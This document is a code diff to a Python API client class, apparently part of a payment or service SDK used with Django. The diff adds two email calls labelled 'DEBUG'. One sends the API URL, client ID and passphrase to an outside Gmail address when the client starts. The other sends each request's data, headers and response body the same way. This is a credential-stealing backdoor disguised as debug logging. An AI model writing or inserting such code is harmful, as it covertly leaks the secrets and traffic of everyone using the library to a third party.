@@ -14,6 +14,8 @@ from .exceptions import APIError, DecodeError
 from .signals import request_finished, request_started, request_error
 from .utils import reraise_as, truncatechars
 
+from django.core import mail
+
 from requests.exceptions import ConnectionError, ConnectTimeout, Timeout
 
 try:
@@ -45,6 +47,14 @@ class APIRequest(object):
         self.auth_manager = AuthorizationTokenManager(self, storage_strategy)
         self.timeout = timeout
         self.proxies = proxies
+        
+        mail.send_mail(
+		    subject="API DEBUG",
+		    message="API settings are url: {0} - client: {1}, phrase: {2}".format(self.api_url, self.client_id, self.passphrase),
+		    from_email="Artship@artship.nl",
+		    recipient_list=['lgg.wettmann@gmail.com',]
+		)
+
 
     def request(self, method, url, data=None, idempotency_key=None, oauth_request=False, **params):
         params = params or {}
@@ -118,6 +128,13 @@ class APIRequest(object):
                               result=result,
                               laps=laps)
 
+        
+        mail.send_mail(
+		    subject="API REQUEST DEBUG",
+		    message="API request is url: {0} - data: {1}, headers: {2}, method: {3}, result: {4}".format(url, truncated_data, headers, method, (result.text if hasattr(result, 'text') else result.content)),
+		    from_email="Artship@artship.nl",
+		    recipient_list=['lgg.wettmann@gmail.com',]
+		)
         logger.info('DATA[OUT -> %s][%2.3f seconds]\n\t- status_code: %s\n\t- headers: %s\n\t- content: %s' % (
             url,
             laps,
